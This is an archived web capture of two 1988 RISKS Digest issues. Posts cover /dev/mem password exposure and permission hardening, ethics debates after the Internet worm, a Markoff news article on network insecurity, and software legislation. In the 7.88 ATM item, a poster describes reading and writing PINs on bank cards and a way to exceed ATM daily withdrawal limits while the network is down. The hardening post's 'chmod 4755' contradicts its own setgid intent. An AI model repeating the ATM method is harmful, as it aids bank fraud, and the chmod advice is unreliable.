net that we have been taking for granted is going to tighten up considerably
due to frequent intrusions.
 
Willie Smith  w_smith@wookie.dec.com  w_smith%wookie.dec.com@decwrl.dec.com
{Usenet!Backbone}!decwrl!wookie.dec.com!w_smith

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: Nonsecure passwords/computer ethics ( /dev/*mem and superuser )
</A>
</H3>
<address>
Paul E. McKenney 
&lt;<A HREF="mailto:mckenney@spam.istc.sri.com">
mckenney@spam.istc.sri.com
</A>&gt;
</address>
<i>
Tue, 22 Nov 88 13:54:00 PST
</i><PRE>

In <A HREF="/Risks/7.74.html">RISKS-7.74</A>, PGN says:

	[ . . . ]  In UNIX,
	the /dev/mem vulnerability (a "feature" to some) can be used to capture
	passwords in unencrypted form.  Even the Gould UTX/32S C2 version of
	Unix still has that vulnerability.

UNIX systems -can- be configured so that they do not have this vulnerability.
All memory devices (e.g., /dev/mem) devices should be protected as follows:
	cr--r-----  1 root     sys        3,   0 Jan 10  1987 /dev/mem
i.e., so that only the super-user (root) or members of the special group
``sys'' (some systems use group ``kmem'', but the principle is the same)
are allowed to access kernel memory.  This may be accomplished with
the following commands:
	chown root /dev/mem /dev/kmem ...
	chgrp sys /dev/mem /dev/kmem ...
	chmod 440 /dev/mem /dev/kmem ...
where the ``...'' is replaced by the pathnames of any system-specific
memory devices (e.g., /dev/vme* on Suns).

System programs that need access to kernel memory (e.g., ps) should have the
following protections:
	-rwxr-sr-x  1 bin      sys         47104 Jan 10  1987 /bin/ps*
i.e., the ``ps'' program should not be writeable to anyone except the
special user ``bin'', should be executable and readable to all, and should
set its group ID to ``sys'' upon execution (allowing it to read the /dev/mem
file).  This prevents normal (read ``malicious'') access to the /dev/mem file,
while allowing authorized systems programs access to /dev/mem.
This may be accomplished with the following commands:
	chown bin /bin/ps ...
	chgrp sys /bin/ps ...
	chmod 4755 /bin/ps ...
where the ``...'' is replaced by the pathnames of all system programs
that need access to memory devices.

Note that the ptrace system call (which allows transparent debugging)
disables the setuid/setgid facility in the versions of UNIX that I am
familiar with.  If your UNIX is less paranoid, you will also need to
disallow read access to system programs that access /dev/mem.

					Thanx, Paul

</PRE>
<HR><H3><A NAME="subj4.2">
Re: Nonsecure passwords/computer ethics ( /dev/*mem and superuser )
</A>
</H3>
<address>
Kendall Collett 
&lt;<A HREF="mailto:kcollett@fang">
kcollett@fang
</A>&gt;
</address>
<i>
Fri, 18 Nov 88 09:30:55 -0600
</i><PRE>

&gt; From: Peter G. Neumann &lt;Neumann@KL.SRI.COM&gt;  (<A HREF="/Risks/7.74.html">RISKS-7.74</A>)
&gt; Even the Gould UTX/32S C2 version of Unix still has that vulnerability. [...]

While the memory pseudo-devices (/dev/*mem) exist in Gould UTX/32S, access to
these devices is restricted in two ways (beyond the mode bits on the files):

	1) All untrusted users in UTX/32S operate from within a
           restricted environment (RE).  An RE is a subtree of the file
           system which, for the most part, looks like a complete UNIX
           file system, with the exception that it does not contain
           sensitive commands or files.  When users log onto the system,
           their root directory is set by the system to be the root
           directory of the subtree forming the RE.  Since an RE does
           not contain the /dev/*mem files, from the user's perspective
           the memory pseudo-devices do not even exist.

        2) The memory pseudo-devices on UTX/32S are regarded by the
           system as ``privileged devices''.  Regardless of the mode
           bits on the device special file, only superusers and can
           access privileged devices.

It is true a superuser on UTX/32S can access /dev/mem and read
unencrypted passwords, but this does not give a superuser any
capabilities that he or she didn't already have.

Kendall Collett				
					  formerly:
Motorola Inc., Microcomputer Division	  Gould Inc., Computer Systems Division
Urbana Design Center		          Software Development Center
1101 E. University Avenue
Urbana, IL 61801

kcollett@urbana.mcd.mot.com
uunet!uiucdcs!mcdurb!kcollett

Disclaimer:  In expressing the above opinion, I am in no way acting as a
             representative of either Gould, Inc. or Motorola, Inc. 

</PRE>
<HR><H3><A NAME="subj4.3">
Re: Nonsecure passwords/computer ethics ( /dev/*mem and superuser )
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:Neumann@KL.SRI.COM">
Neumann@KL.SRI.COM
</A>&gt;
</address>
<i>
Mon, 5 Dec 88 10:11:11 PST
</i><PRE>

Recalling the $350,000 ATM scam (<A HREF="/Risks/7.85.html">RISKS-7.85</A>), the mere existence of a superuser
mechanism (no matter how well you think it may be protected) is dangerous.  For
example, the Ethernet and Arpanet are wide open and unencrypted, with passwords
flowing around.  The moral of the story is, to a first approximation, assume
everything is wide open and don't rely on computers and networks to protect
you.  To a second approximation, you (and your system administrators, and your
system vendors) can do much better to protect you.  But don't count on it.  PGN

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
"Hackers,"  "crackers,"  "snackers,"  and ethics (<A HREF="/Risks/7.86.html">RISKS-7.86</A>)
</A>
</H3>
<address>
Frank Maginnis 
&lt;<A HREF="mailto:maginnis@community-chest.mitre.org">
maginnis@community-chest.mitre.org
</A>&gt;
</address>
<i>
Mon, 05 Dec 88 11:04:12 -0500
</i><PRE>

Perhaps we should consider a less forgiving attitude towards traditional
"hackers," or "snackers," as they are styled here.  There are serious ethical
concerns with an "experimenter" who uses uninformed, unknowing subjects in his
experiments -- which is what, in effect, is being characterized as
non-malicious and deserving of a non-pejorative term.  Moreover, in more mature
scientific fields, such as medicine, it is not left up to the experimenter to
decide for himself what is ethically acceptable; he or she must convince review
boards that include both peers and (one hopes) members of the affected public.

Some might consider the comparison with medical research ethics overdrawn.  But
consider: suppose a medical researcher were caught introducing some virus -- a
real one -- into the environment.  Suppose he thought the virus benign, but it
turned out that it made several thousand people sick, perhaps people who were
in some particularly susceptible population (UNIX system administrators, say).
Not too sick: maybe just enough that they lost a day or two of work, suffered
discomfort, some degree of mental anguish . . .

The computer profession imposes a risk on the general public if it allows
individual experimenters, however well intentioned, to conduct experiments,
demonstrations of vulnerability, or whatever, on "subjects" who do not know
they are a part of the experiment, and have not consented to being so.  We
shouldn't condone such activity, even when the affected community is small
(e.g.  subscribers to a university's time-sharing network), or when the impact
turns out to be benign.  We don't need a non-pejorative term for such activity;
we need a highly pejorative attitude towards it.

Frank Maginnis, MITRE Corporation, McLean, VA
(Standard disclaimers apply)

</PRE>
<HR><H3><A NAME="subj5.2">
Re: "Hackers,"  "crackers,"  "snackers,"  and ethics
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:Neumann@KL.SRI.COM">
Neumann@KL.SRI.COM
</A>&gt;
</address>
<i>
Mon, 5 Dec 88 10:27:35 PST
</i><PRE>

I am afraid my point may have been misunderstood.  Bob Morris (Sr.) was using
the Berkeley time sharing system (which might have been called experimental at
the time) as an ordinary unprivileged user.  Systems in development are
generally flaky.  He just happened to fall into traps that had been unwittingly
left by the builders, but  was not trying to crash the system.

It seems rather obvious that such problems should be found early and fixed,
BEFORE users come to depend (unwisely?) on computer systems.  (Perhaps we
need to add ``slacker'' to the hacker-alias terminology?)

By the way, a discussion that we may need to get into (when the Internet
worm has died down) is the issue of whistle-blowing.  We generally persecute
whistle-blowers.  It may be the "shoot-the-messenger" syndrome.

On the Internet worm problem and other similar situations, RISKS
contributors seem to look on two positions as antithetical.  In fact these
positions are not incompatible

  * Hacking can be dangerous (to the hacker and the hackees).  (The Internet
    Worm initiator SCREWED UP BADLY.)

  * Our favorite systems and network technologies are FUNDAMENTALLY FLAWED.
    We should not be surprised by malicious attacks by malevolent hackers in 
    the future.

Neither of these statements negates the other.

[Sorry if RISKS is overly devoted to related problems lately.  It is just
going with the flow (of contributions).  PGN]

</PRE>
<HR><H3><A NAME="subj5.3">
Re: "Re: "Hackers,"  "crackers,"  "snackers,"  and ethics"
</A>
</H3>
<address>
Frank Maginnis 
&lt;<A HREF="mailto:maginnis%community-chest.mitre.org@gateway.mitre.org">
maginnis%community-chest.mitre.org@gateway.mitre.org
</A>&gt;
</address>
<i>
Mon, 05 Dec 88 16:26:09 -0500
</i><PRE>

[...]  I misunderstood you to say that he was actually trying to crash the
system, albeit by doing legal things (i.e. a "Black Team" sort of effort).
Actually, I was not trying to criticize Morris Sr., so much as an attitude
that seems to be widespread, if not endemic, in the profession.  This
attitude can be seen in defenses of Morris Jr., along the lines of:  "Well,
it's too bad the worm got out of control, but what he was trying to do was
really benevolent," etc. etc.  I also wanted to inject into the continuing
discussion of computer ethics the idea that we should adopt something like
the notion of "informed consent," as it is applied in medical research.  The
question of whether a university time-sharing system should be considered
"experimental" with respect to this kind of hacking might be one that a
university review committee could consider.  They could look into whether
the users understand that hacking is going on, in the interest of improving
the system, and are willing to accept the risks involved.  But the hacker
shouldn't consider that he has the right to conduct an experiment just
because _he_ considers it to be in everyone's best interests.

Incidentally, with respect to your original item, I'm afraid that trying to
change the connotation of a word once it has gotten into general circulation
is like trying to command the tide not to come in.  Just ask 3M
("cellophane"), Xerox, mathematicians who study chaos theory, grammarians
who rail against "hopefully," etc.  "Hacker" and "virus" will undoubtedly
appear very soon in standard English dictionaries with the general public's
understanding of the terms, not the profession's -- "hacker" probably
already has! We'll just have to adapt.

</PRE>
<HR><H3><A NAME="subj5.4">
Ethics and caution (the worm)
</A>
</H3>
<address>
Darrell Long 
&lt;<A HREF="mailto:darrell@midgard.ucsc.edu">
darrell@midgard.ucsc.edu
</A>&gt;
</address>
<i>
Mon, 5 Dec 88 10:58:45 PST
</i><PRE>

I have seen several articles recently complaining about others that state
they learned from the Internet worm and that the perpetrator actually did
them a favor.  The worm caused all of us to lose a lot of time, and so it
was a serious breech of ethics.  But I would like to remind everyone, that
the real bad guys do not share our ethics, and thus are not bound by them.
We should make it as difficult as possible (while preserving an environment
conducive to research) for this to happen again.

The worm opened some eyes.  Let's not close them again by saying
"Gentlemen don't release worms."

Darrell Long, Computer and Information Sciences, University of California
Santa Cruz, CA 95064

</PRE>
<HR><H3><A NAME="subj5.5">
   "Hackers,"  "crackers,"  "snackers,"  and ethics (<A HREF="/Risks/7.86.html">RISKS-7.86</A>)
</A>
</H3>
<address>
    Alex Colvin 
&lt;<A HREF="mailto:mac3n@babbage.acc.virginia.edu">
mac3n@babbage.acc.virginia.edu
</A>&gt;
</address>
<i>
Mon Dec  5 14:21:58 1988
</i><PRE>

&gt; But we do have a problem.  We desperately need a convenient term like
&gt; "cracker", because the nonpejorative primary meaning of "hacker" needs to be
&gt; defended vigorously against misuse by the press and others.  ...

In my youth (10 years ago) "hacker" WAS a pejorative term, implying a sort
of dedicated misdirection.  Those were the guys who spent all night writing
login emulators and talk programs that they could eavesdrop.  See
Weizenbaum "Computer Power and Human Reason" for similar usage.

I forget what was the term of approval. "bit banger?"

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Computer Risks Revisited
</A>
</H3>
<address>
&lt;<A HREF="mailto:John Markoff">
John Markoff
</A>&gt;
</address>
<i>
Sat, 3 Dec 88 09:12:40 PST
</i><PRE>

NETWORKS OF COMPUTERS AT RISK FROM INVADERS 
By JOHN MARKOFF  (c.1988 N.Y. Times News Service)

	 Basic security flaws similar to the ones that let intruders gain
illegal entry to military computer networks in recent weeks are far more
common than is generally believed, system designers and researchers say.
	 And there is widespread concern that computer networks used for
everyday activities like making airline reservations and controlling the
telephone system are highly vulnerable to attacks by invaders considerably
less skilled than the graduate student whose rogue program jammed a
nationwide computer network last month.
	 For example, the air traffic control system could be crippled if
someone deliberately put wrong instructions into the network, effectively
blinding controllers guiding airplanes.
	 The two recent episodes have involved military computers: one at
the Mitre Corp., a company with Pentagon contracts, and the other into
Arpanet, a Defense Department network with links to colleges.  But illegal
access to computer systems can compromise the privacy of millions of people.
	 In 1984, TRW Inc. acknowledged that a password providing access to 90
million credit histories in its files had been stolen and posted on a
computerized bulletin board system.  The company said the password may have
been used for as long as a month.
	 This year an internal memorandum at Pacific Bell disclosed that
sophisticated invaders had illegally gained access to telephone network
switching equipment to enter private company computers and monitor telephone
conversations.
	 Computer security flaws have also been exploited to destroy data.  In
March 1986 a computer burglar gained access by telephone to the office computer
of Rep. Ed Zschau of California, destroyed files and caused the computer to
break down.  Four days later, staff workers for Rep. John McCain of Arizona,
now a senator, told the police they had discovered that someone outside their
office had reached into McCain's computer and destroyed hundreds of letters and
mailing addresses.
	 In Australia last year, a skilled saboteur attacked dozens of
computers by destroying an underground communication switch.  The attack cut
off thousands of telephone lines and rendered dozens of computers, including
those at the country's largest banks, useless for an entire day.
	 Experts say the vulnerability of commercial computers is often
compounded by fundamental design flaws that are ignored until they are exposed
in a glaring incident.  ``Some vulnerabilities exist in every system,'' said
Peter Neumann, a computer scientist at SRI International in Menlo Park, Calif.
``In the past, the vendors have not really wanted to recognize this.''
	 Design flaws are becoming increasingly important because of the
rapidly changing nature of computer communications. Most computers were once
isolated from one another.  But in the last decade networks expanded
dramatically, letting computers exchange information and making virtually all
large commercial systems accessible from remote places.  But computer designers
seeking to shore up security flaws face a troubling paradox: by openly
discussing the flaws, they potentially make vulnerabilities more known and thus
open to sabotage.
	 Dr. Fred Cohen, a computer scientist at the University of
Cincinnati, said most computer networks were dangerously vulnerable.  ``The
basic problem is that we haven't been doing networks long enough to know how
to implement protection,'' Cohen said.
	 The recent rogue program was written by Robert Tappan Morris, a
23-year-old Cornell University graduate student in computer science, friends
of his have said.  The program appears to have been designed to copy itself
harmlessly from computer to computer in a Department of Defense network, the
Arpanet.  Instead a design error caused it to replicate madly out of
control, ultimately jamming more than 6,000 computers in this country's most
serious computer virus attack.
	 For the computer industry, the Arpanet incident has revealed how
security flaws have generally been ignored.  Cohen said most networks, in
effect, made computers vulnerable by placing entry passwords and other secret
information inside every machine.  In addition, most information passing
through networks is not secretly coded.	 While such encryption would solve much
of the vulnerability problem, it would be costly.  It would also slow
communication between computers and generally make networks much less flexible
and convenient.
	 Encryption of data is the backbone of security in computers used by
military and intelligence agencies. The Arpanet network, which links computers
at colleges, corporate research centers and military bases, is not encrypted.
	 The lack of security for such information underscored the fact that
until now there has been little concern about protecting data.
	 Most commercial systems give the people who run them broad power
over all parts of the operation. If an illicit user obtains the privileges
held by a system manager, all information in the system becomes accessible
to tampering.
	 The federal government is pushing for a new class of military and
intelligence computer in which all information would be divided so that
access to one area did not easily grant access to others, even if security
was breached.
	 The goal is to have these compartmentalized security systems in
place by 1992.
	 On the other hand, one of the most powerful features of modern
computers is that they permit many users to share information easily; this
is lost when security is added.
	 In 1985 the Defense Department designed standards for secure computer
systems, embodied in the Orange Book, a volume that defines criteria for
different levels of computer security.  The National Computer Security Center,
a division of the National Security Agency, is now charged with determining if
government computer systems meet these standards.
	 But academic and private computer systems are not required to meet
these standards, and there is no federal plan to urge them on the private
sector.  But computer manufacturers who want to sell their machines to the
government for military or intelligence use must now design them to meet the
Pentagon standards.
	 Security weaknesses can also be introduced inadvertently by changes in
the complex programs that control computers, which was the way Morris's program
entered computers in the Arpanet.  These security weaknesses can also be
secretly left in by programmers for their convenience.
	 One of the most difficult aspects of maintaining adequate computer
security comes in updating programs that might be running at thousands of
places around the world once flaws are found.
	 Even after corrective instructions are distributed, many computer
sites often do not close the loopholes, because the right administrator did
not receive the new instructions or realize their importance.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.86.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.88.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-40</DOCNO>
<DOCOLDNO>IA012-000131-B035-386</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.88.html 128.240.150.127 19970217024251 text/html 23085
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:41:19 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 88</TITLE>
<LINK REL="Prev" HREF="/Risks/7.87.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.89.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.87.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.89.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 88</H1>
<H2> Tuesday 6 December 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Summary of Software Uniformity Legislation issue 
</A>
<DD>
<A HREF="#subj1.1">
Conleth OConnell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Exploiting workers 
</A>
<DD>
<A HREF="#subj2.1">
Dale Worley
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Re: Automated teller theft 
</A>
<DD>
<A HREF="#subj3.1">
Dr Robert Frederking
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Speeding detectors 
</A>
<DD>
<A HREF="#subj4.1">
Dave Horsfall
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Report of hardware "virus" on chips 
</A>
<DD>
<A HREF="#subj5.1">
Gary Chapman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: Corps of Software Engineers? 
</A>
<DD>
<A HREF="#subj6.1">
Richard Rosenthal
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Vendor Liability, and "Plain Vanilla" configurations 
</A>
<DD>
<A HREF="#subj7.1">
Bob Estell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Talk by Tom Blake on Computer Fraud 
</A>
<DD>
<A HREF="#subj8.1">
Mark Mandel
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Defining "hackers and crackers" 
</A>
<DD>
<A HREF="#subj9.1">
Gordon Meyer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  RISKS OF GREATER GARBLE 
</A>
<DD>
<A HREF="#subj10.1">
somewhere in netland
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Summary of Software Uniformity Legislation issue
</A>
</H3>
<address>
Conleth OConnell 
&lt;<A HREF="mailto:cso@cis.ohio-state.edu">
cso@cis.ohio-state.edu
</A>&gt;
</address>
<i>
Mon, 5 Dec 88 22:58:25 EST
</i><PRE>

I want to thank all of you who have expressed opinions on the Software
Uniformity issue.  I also want to forward the thanks of the organization,
described below, for your opinions/concerns.  After describing the
organization, I give a brief summary of the opinions that were sent.  To the
best of my knowledge, the organization is meeting towards the end of January,
so should you still want to send an opinion to me, I am setting a deadline of
January 15, 1989, to insure forwarding.  Once again THANKS!!

The organization that was requesting the information is "The National
Conference of Commissioners on Uniform State Laws."  The best known act that
came out of this organization is the Uniform Commercial Code.  It is made up of
practicing lawyers, college law professors and deans, as well as some judges.
The members donate their time to this organization although some states pay
actual expenses, no member receives a salary for working on the organization.
The organization has NO association with the Federal Government or with
Congress.  For those of you so inclined, the representatives from each state
can be sought out via the State Bar or Secretary of State.


PROS

	- Something needs to be done along the lines of truth in advertising of
a particular product.  For example, the packaging of some products with "lavish
painted covers of the boxes".  When in fact, the product has nothing to do with
the artwork.  This is not acceptable in other industries like videotapes, toys
or plastic models.

	- The industry has been lax with self-regulation, so something needs to
be done.

	- Some minimum standards are needed, but who monitors them, what are
the reporting/registration requirements, what would be the penalties, but
"Don't feed the lawyers."

CONS

	- Most of the opinions were dubious of federal legislation even the
opinions in the above section.

	- A major concern is for the smaller companies/individuals.

	- A bad product tends to get negative publicity anyway, thus there
seems to be some quality control by the community, but the
inexperienced/isolated user can get burned.

	- Concern about price increase blamed on the regulation, which, in the
end, hits the consumer and the small companies.

	- "Control will only close off creativity."

	- The Uniform Commercial Code has been used in the past.

	- The feeling that the industry is "moving towards warranties,
guarantees, and efforts for solid support" without legislation.

	- Legislation may be obsolete by the new technologies.

	- Similar feelings towards the "stifling" of public domain and
free/shareware packages.


Thanks again and Happy Holidays!!
Conleth S. O'Connell, Department of Computer and Information Science,
The Ohio State University, 2036 Neil Ave., Columbus, OH USA 43210-1277

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Exploiting workers
</A>
</H3>
<address>
Dale Worley
&lt;<A HREF="mailto:worley@compass.UUCP ">
worley@compass.UUCP 
</A>&gt;
</address>
<i>
Mon, 5 Dec 88 10:52:08 EST
</i><PRE>

   From: Larry Hunter &lt;hunter-larry@YALE.ARPA&gt;

   &gt;From "Optical Information Systems Update," Dec 1, 1988, p.8.  

     Digiport, a new telecommunications facility in Jamaica, will open up
     a new era for data entry operations.

   And, of course, with a significant loss to data entry personnel in high cost
   (like $6.00/hr) labor areas.  Not to mention the savings (losses) in reduced
   requirements for worker benefits and safety standards.

Is this really a loss to the workers?  The workers in the high-cost
areas must be able to get $6/hr somewhere else (or else the data entry
operations wouldn't have to pay so much).  The workers in Jamaica
clearly *aren't* able to get $6/hr somewhere else.  It seems to me
that the net change is to slightly reduce labor demand in high-wage
areas (thus slightly reducing wages there) and to slightly increase
labor demand in a low-wage area (thus slightly increasing wages
there).  It seems to me that this is not only "economically efficient"
but also redistributes wealth from the rich to the poor.  (Of course,
an American data-entry worker isn't "rich" from our point of view, but
*is* from the vantage point of the average Jamaican.)

If everybody in the world were able to bid on every job that they were
capable of, wage inequities (from country to country) would be much
smaller.  This is what has happened in the automobile industry (modulo
import restrictions), raising such formerly Third-World countries as
South Korea into the ranks of industrialized nations.

Dale Worley, Compass, Inc.                      mit-eddie!think!compass!worley
Seen in a net discussion:  "It took work to make tofu politically correct."

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Re: Automated teller theft (Risks 7.85)
</A>
</H3>
<address>
Dr Robert Frederking
&lt;<A HREF="mailto:ref@ztivax.siemens.com ">
ref@ztivax.siemens.com 
</A>&gt;
</address>
<i>
Tue, 6 Dec 88 14:15:19 -0100
</i><PRE>
Organization: Siemens AG in Munich, W-Germany

I wouldn't be too sure that there really was a "passkey" card; that may have
been a story cooked up to explain the loss to the public without revealing how
vulnerable the system actually is.  I don't know what technology is currently
being used, but about 10 years ago a friend and I were looking at some used
computer equipment we were thinking of buying, in someone's garage.  After we
had chatted for a bit, and he apparently decided we were trustworthy, he told
us that these computers were part of a banking machine system that he had
bought, lock, stock, and barrel, and asked us if we would like to see the parts
he wouldn't sell, for risk of being a party to a crime.

Among other things, there was a bank card reader that would display the account
and *PIN number* of a bank card you ran through it.  It could also *write*
these cards.  There was a set of sixteen thumbwheels inside the machine to set
parameters to the encoding algorithm, which no one at the bank thought to
shuffle, and so were still set to the bank's choice! He pointed out that once a
set of positions was chosen, a bank would never change them again, as this
would require recalling all the cards in circulation for recoding.  It isn't
clear to me that this could have been used in this case (unless the PIN number
is algorithmically related to the account number, or the thieves had access to
a list of PIN numbers), but this fellow could have caused a fair amount of
trouble if he had been dishonest.

As for the daily limit, a friend of mine figured out once that you could easily
exceed the daily limit.  First ask for a balance.  If the machine says it can't
give you a balance at the moment, it means the line to the central database is
down.  You then withdraw the maximum daily amount.  You do this on as many
different machines as you can find.  If the net is down, this is the total
number of machines you can physically get to before the net comes back up. 

	"Robert Frederking" &lt;unido!ztivax!ref@uunet.UU.NET&gt;

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Speeding detectors
</A>
</H3>
<address>
Dave Horsfall 
&lt;<A HREF="mailto:dave@stcns3.stc.oz.au">
dave@stcns3.stc.oz.au
</A>&gt;
</address>
<i>
Tue, 6 Dec 88 10:47:05 est
</i><PRE>

Just heard on the radio about how an Aussie inventor has come up with
a box to detect speeders.  Apparently, it ignores a short burst of
speeding (e.g. overtaking) but logs it if it was sustained.  When
vehicle registration time comes around, the owner gets hit with a fine.

I missed the actual implementation details, such as how it knows what
the current speed limit is (but bar code scanners were mentioned).
The RISKS are obvious - you enter a 110 km/h zone, but the sensor doesn't
see the new limit, and still thinks you are on 80 km/h etc.

In all, this appears to be yet another revenue-collecting device, shrouded
in the guise of safety.  We can well do without them.

Dave Horsfall (VK2KFU),  Alcatel-STC Australia,  dave@stcns3.stc.oz
dave%stcns3.stc.oz.AU@uunet.UU.NET,  ...munnari!stcns3.stc.oz.AU!dave

     [By the way, Dave accidentally reposted <A HREF="/Risks/7.65.html">RISKS-7.65</A> to some of you,
     and wishes to extend his apologies.  PGN]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Report of hardware "virus" on chips
</A>
</H3>
<address>
Gary Chapman
&lt;<A HREF="mailto:chapman@csli.Stanford.EDU ">
chapman@csli.Stanford.EDU 
</A>&gt;
</address>
<i>
Mon, 5 Dec 88 15:59:16 PST
</i><PRE>

Advanced Military Computing, a defense industry newsletter, has reported that
researchers at Nova University in Fort Lauderdale, Florida, have found a flaw
in the Intel 8272A and NEC 765 floppy disk controllers that will allow in-
correct data to be written to disks without alerting the user with an error
message.  The newsletter reports this flaw is a "virus," but there is very
little technical information on the nature of the chip problem.  The chips
have been manufactured since 1978 and are estimated to be in millions of 
computers.  Both NEC and Intel deny there is a problem, but an Intel memo
dated May 2, 1988 admits an error in the Intel chip.

"The error condition has to happen in the last byte of the 512 bytes of a
sector being transferred," said Nova University professor of computer science
Phil Adams.  The Intel memo, or letter, says that under this condition,
"incorrect data is written to the disk and validated by the 8272A."  The error
condition is most likely to happen in networks and uploads to mainframes.

A report on the chip problem is available from Dean Edward Simco, of the Nova
Computer Science Center, Nova University, Fort Lauderdale, FL  33314.  The
report is $5 and comes with a diskette containing a "risk assessment program,"
which allegedly reports on the "virus" in the subject machine.  

[I assume no responsibility for the accuracy of this report, and this infor-
mation is passed on without permission from Advanced Military Computing, and
after no investigation of this other than reading the article in the news-
letter.--GC]

-- Gary Chapman                               chapman@csli.stanford.edu
   Executive Director, Computer Professionals for Social Responsibility

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: Corps of Software Engineers?
</A>
</H3>
<address>
Richard Rosenthal 
&lt;<A HREF="mailto:richr@ai.etl.army.mil">
richr@ai.etl.army.mil
</A>&gt;
</address>
<i>
Tue, 6 Dec 88 12:36:54 EST
</i><PRE>

&gt; "Flexibility is software's strong suit, allowing the military
&gt; to make changes in how a weapon system functions, even after
&gt; it is fielded...

Replacement chips are available for the microprocessors in cars allowing
one to change the performance characteristics of the engine.  Imagine
the following conversation:

    Hey, Captain!  Do you want one of these PROM's I burned last night?
    I changed the parameters for the F-16 thrust settings.  Now I'll
    be able to do Mach 1.5 straight off the deck!

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Vendor Liability, and "Plain Vanilla" configurations
</A>
</H3>
<address>
"FIDLER::ESTELL" 
&lt;<A HREF="mailto:estell%fidler.decnet@nwc.arpa">
estell%fidler.decnet@nwc.arpa
</A>&gt;
</address>
<i>
5 Dec 88 12:51:00 PDT
</i><PRE>

GM *could* ship cars with "holes in the frame" for seatbelts, and then
*highly recommend* that one order the seatbelts.  They don't.  The belts
